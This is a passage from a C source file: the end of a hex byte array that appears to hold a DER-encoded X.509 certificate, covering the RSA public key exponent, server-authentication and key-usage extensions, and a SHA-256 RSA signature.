	0x97, 0x10, 0x4b, 0xb4, 0x07, 0x24, 0x0e, 0xcc, 0x8e, 0xda, 0xbc, 0x9a, 0x83, 0x05, 0x8c, 0xd5, 0xf9, 0xbe, 0x5c, 0x24, 0x21, 0xce, 0x36, 0x3f, 0xf8, 0x31, 0xfc, 0x34, 0x27, 0x0f, 0x33, 0xa2,
	0xa8, 0x93, 0x57, 0x88, 0x43, 0xca, 0x9d, 0x1a, 0xfa, 0x50, 0xf8, 0x7c, 0x98, 0x0a, 0xdb, 0xf8, 0x9e, 0x28, 0xe2, 0xd4, 0x01, 0xfd, 0x85, 0xfa, 0x6a, 0x00, 0x76, 0x7a, 0x87, 0xf8, 0xee, 0x84,
	0x27, 0xb8, 0x2f, 0x8d, 0x3b, 0x1b, 0x6b, 0x89, 0x56, 0xef, 0xc4, 0x2e, 0x02, 0xf2, 0xb7, 0x85, 0x90, 0x25, 0x56, 0x48, 0x94, 0xbb, 0x0b, 0xfc, 0x0e, 0xda, 0x4d, 0x43, 0xdc, 0x1a, 0xe1, 0x90,
	0xb0, 0x51, 0x51, 0x02, 0x03, 0x01, 0x00, 0x01,/**/ 0xa3, 0x24, 0x30, 0x22, 0x30, 0x13, 0x06, 0x03, 0x55, 0x1d, 0x25, 0x04, 0x0c, 0x30, 0x0a, 0x06, 0x08, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x07, 0x03,
	0x01, 0x30, 0x0b, 0x06, 0x03, 0x55, 0x1d, 0x0f, 0x04, 0x04, 0x03, 0x02, 0x04, 0x30, 0x30, 0x0d, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x0b, 0x05, 0x00, 0x03, 0x82, 0x01,
	0x01, 0x00, 0x81, 0x5c, 0x86, 0x0a, 0x02, 0xd0, 0xe0, 0x7c, 0x6e, 0x10, 0x43, 0x19, 0x1b, 0x55, 0xe3, 0xd8, 0x22, 0xf1, 0xf0, 0x71, 0x86, 0xfa, 0x89, 0xc1, 0xd6, 0x36, 0xf1, 0x50, 0x2c, 0x2d,
	0x02, 0xbe, 0xc8, 0x49, 0x98, 0x14, 0xf3, 0xdf, 0xa7, 0xef, 0x7d, 0xd7, 0x8f, 0x04, 0xdd, 0x53, 0xec, 0x18, 0x12, 0x64, 0x55, 0x91, 0x5e, 0x99, 0xaf, 0x5d, 0xb0, 0xd2, 0xed, 0x25, 0xf6, 0x6e,
	0x02, 0xa5, 0x6f, 0x52, 0x65, 0x92, 0x61, 0xbd, 0xb1, 0xc6, 0xc3, 0xdb, 0x8d, 0xa9, 0xf3, 0xf0, 0xf6, 0x80, 0x55, 0x72, 0x04, 0x7e, 0xcb, 0x71, 0x71, 0x7a, 0xcd, 0x8b, 0xc8, 0xb8, 0x84, 0x12,
	0x60, 0x1a, 0xc1, 0x09, 0x65, 0x21, 0x0f, 0xe0, 0xe5, 0x19, 0x75, 0xc1, 0xa6, 0xd7, 0x8d, 0x75, 0x9d, 0x57, 0x58, 0xfd, 0x31, 0xad, 0xe1, 0xc8, 0xa8, 0x09, 0x83, 0x4a, 0x3f, 0xc0, 0xe9, 0x33,
	0xc3, 0x0b, 0x17, 0x73, 0x2e, 0x88, 0x41, 0xd5, 0x94, 0x7c, 0x49, 0x13, 0xf2, 0x15, 0xac, 0x64, 0xe4, 0xba, 0x06, 0xdb, 0x4a, 0x83, 0x1e, 0x26, 0x92, 0xdf, 0xc5, 0x7d, 0xe3, 0xad, 0xea, 0x55,
	0xcf, 0x92, 0xf9, 0xcb, 0xe0, 0x76, 0x25, 0xae, 0x77, 0xf0, 0x42, 0x0b, 0x85, 0xad, 0xa7, 0x2c, 0xcd, 0x73, 0x8d, 0x60, 0x46, 0x57, 0x0c, 0x84, 0x00, 0x3b, 0x1a, 0xad, 0x87, 0xb3, 0x96, 0x33,
	0xcb, 0x58, 0x41, 0x62, 0x3b, 0x37, 0x9d, 0x23, 0x50, 0xf3, 0xae, 0x30, 0x93, 0x31, 0x6b, 0xd5, 0xef, 0x6c, 0xf7, 0x94, 0x88, 0xc7, 0x0b, 0xe1, 0x0b, 0x4f, 0x1a, 0x65, 0x03, 0x97, 0x33, 0xb2,
	0xa3, 0xda, 0xf4, 0xfb, 0xcb, 0xfc, 0x75, 0xa7, 0x85, 0xe4, 0x4c, 0x39, 0x47, 0x03, 0x55, 0x1b, 0x84, 0x35, 0x8e, 0xde, 0x43, 0xa2, 0xef, 0x45, 0x89, 0x2c, 0xc6, 0xa2, 0x36, 0xda, 0x2f, 0xd7,
	0x61, 0xe7,
};